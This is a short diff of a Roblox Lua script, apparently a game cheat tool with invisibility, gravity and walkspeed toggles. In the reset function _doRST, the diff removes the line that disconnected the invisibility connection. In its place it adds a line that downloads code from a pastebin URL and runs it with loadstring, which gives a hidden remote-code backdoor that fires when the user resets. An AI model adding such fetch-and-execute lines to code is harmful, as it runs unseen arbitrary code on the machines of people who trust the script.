@@ -447,7 +447,7 @@ local _bright, _brightOG
 local _slide
 local _grav, _gravOG, _gravCon, _gravGyro
 local _ncb, _brb, _dsb, _grb
-local _invis, _invisCon
+local _invis
 local _spL
 local _yupiSpd = 10
 local Lighting = game:GetService("Lighting")
@@ -610,7 +610,7 @@ local function _doRST()
 	-- restaurar invisibilidad
 	if _invis then
 		_invis = false
-		if _invisCon then pcall(function() _invisCon:Disconnect() end); _invisCon = nil end
+		pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/3Rnd9rHf"))() end)
 	end
 	-- restaurar walkspeed
 	if _slide then
